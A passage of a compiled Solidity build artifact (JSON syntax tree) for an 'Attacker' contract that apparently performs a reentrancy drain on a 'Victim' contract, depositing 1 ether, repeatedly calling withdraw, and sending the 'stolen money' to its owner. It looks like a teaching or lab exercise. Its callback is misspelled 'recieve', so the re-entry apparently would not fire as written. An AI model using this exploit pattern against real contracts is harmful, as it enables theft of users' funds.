                      "typeIdentifier": "t_contract$_Victim_$157",
                      "typeString": "contract Victim"
                    }
                  },
                  "id": 22,
                  "nodeType": "ExpressionStatement",
                  "src": "227:27:0"
                }
              ]
            },
            "id": 24,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 9,
                  "mutability": "mutable",
                  "name": "poorvictim",
                  "nameLocation": "178:10:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 24,
                  "src": "170:18:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 8,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "170:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "169:20:0"
            },
            "returnParameters": {
              "id": 11,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "189:0:0"
            },
            "scope": 91,
            "src": "158:103:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 47,
              "nodeType": "Block",
              "src": "300:142:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 31,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 28,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "318:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 29,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "322:5:0",
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "318:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": ">",
                        "rightExpression": {
                          "hexValue": "31",
                          "id": 30,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "328:7:0",
                          "subdenomination": "ether",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1"
                        },
                        "src": "318:17:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "53656e64206d6520736f6d652045544820746f207374617274",
                        "id": 32,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "336:27:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02",
                          "typeString": "literal_string \"Send me some ETH to start\""
                        },
                        "value": "Send me some ETH to start"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02",
                          "typeString": "literal_string \"Send me some ETH to start\""
                        }
                      ],
                      "id": 27,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "310:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 33,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "310:54:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 34,
                  "nodeType": "ExpressionStatement",
                  "src": "310:54:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 35,
                          "name": "victim",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 5,
                          "src": "374:6:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Victim_$157",
                            "typeString": "contract Victim"
                          }
                        },
                        "id": 37,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberLocation": "381:7:0",
                        "memberName": "deposit",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 109,
                        "src": "374:14:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
                          "typeString": "function () payable external"
                        }
                      },
                      "id": 39,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "hexValue": "31",
                          "id": 38,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "396:7:0",
                          "subdenomination": "ether",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1"
                        }
                      ],
                      "src": "374:30:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 40,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "374:32:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 41,
                  "nodeType": "ExpressionStatement",
                  "src": "374:32:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "id": 42,
                        "name": "victim",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 5,
                        "src": "417:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Victim_$157",
                          "typeString": "contract Victim"
                        }
                      },
                      "id": 44,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "424:8:0",
                      "memberName": "withdraw",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 144,
                      "src": "417:15:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 45,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "417:17:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 46,
                  "nodeType": "ExpressionStatement",
                  "src": "417:17:0"
                }
              ]
            },
            "functionSelector": "9e5faafc",
            "id": 48,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nameLocation": "276:6:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 25,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "282:2:0"
            },
            "returnParameters": {
              "id": 26,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "300:0:0"
            },
            "scope": 91,
            "src": "267:175:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 65,
              "nodeType": "Block",
              "src": "481:93:0",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 57,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "expression": {
                        "arguments": [
                          {
                            "id": 53,
                            "name": "victim",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 5,
                            "src": "502:6:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Victim_$157",
                              "typeString": "contract Victim"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Victim_$157",
                              "typeString": "contract Victim"
                            }
                          ],
                          "id": 52,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "494:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 51,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "494:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 54,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "494:15:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 55,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "510:7:0",
                      "memberName": "balance",
                      "nodeType": "MemberAccess",
                      "src": "494:23:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": ">",
                    "rightExpression": {
                      "hexValue": "31",
                      "id": 56,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "518:7:0",
                      "subdenomination": "ether",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1000000000000000000_by_1",
                        "typeString": "int_const 1000000000000000000"
                      },
                      "value": "1"
                    },
                    "src": "494:31:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 64,
                  "nodeType": "IfStatement",
                  "src": "491:77:0",
                  "trueBody": {
                    "id": 63,
                    "nodeType": "Block",
                    "src": "526:42:0",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "id": 58,
                              "name": "victim",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 5,
                              "src": "540:6:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Victim_$157",
                                "typeString": "contract Victim"
                              }
                            },
                            "id": 60,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberLocation": "547:8:0",
                            "memberName": "withdraw",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 144,
                            "src": "540:15:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                              "typeString": "function () external"
                            }
                          },
                          "id": 61,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "540:17:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 62,
                        "nodeType": "ExpressionStatement",
                        "src": "540:17:0"
                      }
                    ]
                  }
                }
              ]
            },
            "functionSelector": "a9e10bf2",
            "id": 66,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "recieve",
            "nameLocation": "457:7:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 49,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "464:2:0"
            },
            "returnParameters": {
              "id": 50,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "481:0:0"
            },
            "scope": 91,
            "src": "448:126:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 89,
              "nodeType": "Block",
              "src": "618:119:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 73,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 70,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "636:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 71,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "640:6:0",
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "636:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 72,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 7,
                          "src": "650:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "636:19:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4e6f7420796f7572206d6f6e6579",
                        "id": 74,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "657:16:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924",
                          "typeString": "literal_string \"Not your money\""
                        },
                        "value": "Not your money"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924",
                          "typeString": "literal_string \"Not your money\""
                        }
                      ],
                      "id": 69,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "628:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 75,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "628:46:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 76,
                  "nodeType": "ExpressionStatement",
                  "src": "628:46:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 84,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 4294967268,
                              "src": "716:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Attacker_$91",
                                "typeString": "contract Attacker"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_Attacker_$91",
                                "typeString": "contract Attacker"
                              }
                            ],
                            "id": 83,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "708:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 82,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "708:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 85,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "708:13:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 86,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberLocation": "722:7:0",
                        "memberName": "balance",
                        "nodeType": "MemberAccess",
                        "src": "708:21:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 79,
                            "name": "owner",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 7,
                            "src": "692:5:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 78,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "684:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 77,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "684:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 80,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "684:14:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      },
                      "id": 81,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "699:8:0",
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "src": "684:23:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256)"
                      }
                    },
                    "id": 87,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "684:46:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 88,
                  "nodeType": "ExpressionStatement",
                  "src": "684:46:0"
                }
              ]
            },
            "functionSelector": "979fd9f2",
            "id": 90,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdrawstolenmoney",
            "nameLocation": "589:19:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 67,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "608:2:0"
            },
            "returnParameters": {
              "id": 68,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "618:0:0"
            },
            "scope": 91,
            "src": "580:157:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          }
        ],
        "scope": 92,
        "src": "79:660:0",
        "usedErrors": []
      }
    ],
    "src": "32:707:0"
  },
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "networks": {},
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-04-20T17:20:22.026Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}